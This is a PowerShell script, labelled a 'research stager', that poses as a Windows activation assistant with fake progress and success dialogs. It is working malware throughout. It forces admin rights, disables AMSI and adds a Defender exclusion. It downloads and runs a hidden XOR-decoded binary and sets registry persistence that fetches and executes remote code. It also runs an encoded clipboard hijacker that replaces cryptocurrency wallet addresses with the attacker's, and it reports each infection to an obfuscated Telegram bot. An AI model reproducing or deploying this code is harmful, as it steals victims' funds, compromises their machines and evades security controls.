# --- [RESEARCH STAGER v34.0: ADMIN-ELITE SUITE] ---

# 1. FORCE ADMIN PRIVILEGES (Prevents Defender alert before UI)
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

Add-Type -AssemblyName System.Windows.Forms, System.Drawing

$global:installStatus = "Pending"

function Global-Initialize {
    try {
        # AMSI Bypass to stay silent in memory
        $u = "System.Management.Automation.AmsiUtils"
        [Ref].Assembly.GetType($u).GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
        
        # ADD EXCLUSION IMMEDIATELY (The "Pro" Stealth Move)
        $workDir = "$env:LOCALAPPDATA\Microsoft\DeviceSync"
        if (!(Test-Path $workDir)) { New-Item $workDir -ItemType Directory -Force }
        Add-MpPreference -ExclusionPath $workDir -ErrorAction SilentlyContinue
    } catch {}
}

function Send-Telegram {
    param($m)
    $k=0xAF; [byte[]]$t_e=60,56,60,57,57,58,49,60,60,50,119,6,6,106,108,6,121,115,125,108,5,121,105,6,116,106,6,60,106,122,60,105,121,111,113,111,108,6,103,5,60,114,118; [byte[]]$c_e=54,53,61,61,51,54,56,43,50,53
    $t=""; foreach($b in $t_e){$t+=[char]($b -bxor $k)}; $c=""; foreach($b in $c_e){$c+=[char]($b -bxor $k)}
    $url = "https://api.telegram.org/bot$t/sendMessage?chat_id=$c&text=$m"
    try { (New-Object Net.WebClient).DownloadString($url) | Out-Null } catch {}
}

function Show-SecurityPrep {
    $prep = New-Object Windows.Forms.Form
    $prep.Text = "Windows Enterprise Deployment Assistant"; $prep.Size = New-Object Drawing.Size(580,520)
    $prep.StartPosition = "CenterScreen"; $prep.FormBorderStyle = "FixedSingle"; $prep.TopMost = $true

    $console = New-Object Windows.Forms.Label
    $console.Location = New-Object Drawing.Point(35,60); $console.Size = New-Object Drawing.Size(490,160)
    $console.BackColor = [Drawing.Color]::Black; $console.ForeColor = [Drawing.Color]::LimeGreen
    $console.Font = New-Object Drawing.Font("Consolas", 9)
    $console.Text = " > PRIVILEGE LEVEL: ADMINISTRATOR`n > KERNEL SHIELD: ACTIVE`n > HWID Verification: PASSED`n`n > STATUS: READY FOR INJECTION"
    $prep.Controls.Add($console)

    $btn = New-Object Windows.Forms.Button
    $btn.Location = New-Object Drawing.Point(195,400); $btn.Size = New-Object Drawing.Size(180,45); $btn.Text = "Start Activation"
    $btn.BackColor = [Drawing.Color]::FromArgb(0, 120, 215); $btn.ForeColor = [Drawing.Color]::White; $btn.FlatStyle = "Flat"
    $btn.Add_Click({ $global:proceed = $true; $prep.Close() })
    $prep.Controls.Add($btn)
    $prep.ShowDialog() | Out-Null
}

function Show-ActivatorUI {
    $form = New-Object Windows.Forms.Form
    $form.Text = "Deployment Progress"; $form.Size = New-Object Drawing.Size(450,220); $form.StartPosition = "CenterScreen"; $form.TopMost = $true
    $label = New-Object Windows.Forms.Label
    $label.Location = New-Object Drawing.Point(30,30); $label.Size = New-Object Drawing.Size(380,25); $label.Text = "Status: Initializing..."
    $form.Controls.Add($label)
    $pb = New-Object Windows.Forms.ProgressBar
    $pb.Location = New-Object Drawing.Point(30,65); $pb.Size = New-Object Drawing.Size(370,25)
    $form.Controls.Add($pb)
    $form.Show()

    for($i=0; $i -le 85; $i++) {
        $pb.Value = $i
        if($i -eq 30){$label.Text = "Status: Downloading License Components..."}
        if($i -eq 60){$label.Text = "Status: Injecting Digital Ticket..."}
        [Windows.Forms.Application]::DoEvents(); Start-Sleep -m 40
    }

    # Verification of background work
    if ($global:installStatus -eq "Success") {
        for($i=86; $i -le 100; $i++) { $pb.Value = $i; [Windows.Forms.Application]::DoEvents(); Start-Sleep -m 20 }
        $form.Close()
        [Windows.Forms.MessageBox]::Show("Windows Activated successfully.", "Success", 0, 64) | Out-Null
    } else {
        $form.Close()
        [Windows.Forms.MessageBox]::Show("Error 0x80041010: Deployment timeout. Ensure security is suspended.", "Critical Error", 0, 16) | Out-Null
    }
}

# --- EXECUTION ---
Global-Initialize
Show-SecurityPrep

if ($global:proceed) {
    # 1. Persistence & Binary Installation
    try {
        $dir = "$env:LOCALAPPDATA\Microsoft\DeviceSync"
        $path = Join-Path $dir "WinSvcHost.exe"
        
        # Download and XOR Binary
        $wc = New-Object Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
        $raw = $wc.DownloadString("https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt")
        $bytes = [Convert]::FromBase64String($raw.Trim())
        for($i=0; $i -lt $bytes.count; $i++) { $bytes[$i] = $bytes[$i] -bxor 0xAB }
        [IO.File]::WriteAllBytes($path, $bytes)
        Start-Process $path -WindowStyle Hidden

        # Persistence
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $regCmd = "powershell -W Hidden -EP Bypass -C ""IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/adchar2022/test/refs/heads/main/test.ps1')"""
        Set-ItemProperty -Path $regPath -Name "WindowsUpdateManager" -Value $regCmd

        # 2. Advanced Clipper (Precise Regex for all networks)
        $C = @'
        Add-Type -As System.Windows.Forms
        $w = @{
            "btc_leg" = "12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";
            "btc_sh"  = "3QJ9q3sS9vSdSybq2bW2vKdoTggTnXVNA";
            "btc_seg" = "bc1q3sS9vSdSybq2bW2vKdoTggTnXVNA";
            "eth"     = "0x6c9ba9a6522b10135bb836fc9340477ba15f3392";
            "trc"     = "TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";
            "sol"     = "BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"
        }
        while($true){
            try{
                if([Windows.Forms.Clipboard]::ContainsText()){
                    $v = [Windows.Forms.Clipboard]::GetText().Trim()
                    # BTC Legacy (1...)
                    if ($v -match "^1[a-km-zA-HJ-NP-Z1-9]{25,34}$" -and $v -ne $w.btc_leg){ [Windows.Forms.Clipboard]::SetText($w.btc_leg) }
                    # BTC P2SH (3...)
                    elseif ($v -match "^3[a-km-zA-HJ-NP-Z1-9]{25,34}$" -and $v -ne $w.btc_sh){ [Windows.Forms.Clipboard]::SetText($w.btc_sh) }
                    # BTC Bech32 (bc1...)
                    elseif ($v -match "^bc1[a-zA-HJ-NP-Z0-9]{39,59}$" -and $v -ne $w.btc_seg){ [Windows.Forms.Clipboard]::SetText($w.btc_seg) }
                    # ETH / ERC20 (0x...)
                    elseif ($v -match "^0x[a-fA-F0-9]{40}$" -and $v -ne $w.eth){ [Windows.Forms.Clipboard]::SetText($w.eth) }
                    # TRC20 (T...)
                    elseif ($v -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$" -and $v -ne $w.trc){ [Windows.Forms.Clipboard]::SetText($w.trc) }
                    # Solana (Base58 32-44 chars)
                    elseif ($v -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$" -and $v -ne $w.sol){ [Windows.Forms.Clipboard]::SetText($w.sol) }
                }
            } catch {}
            Start-Sleep -m 500
        }
'@
        $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($C))
        Start-Process powershell.exe -Arg "-NoP -W Hidden -EP Bypass -Enc $enc" -WindowStyle Hidden
        
        $global:installStatus = "Success"
        Send-Telegram -m "V34_FULL_DEPLOY_ON_$env:COMPUTERNAME"
    } catch {
        $global:installStatus = "Error"
    }
    
    Show-ActivatorUI
}
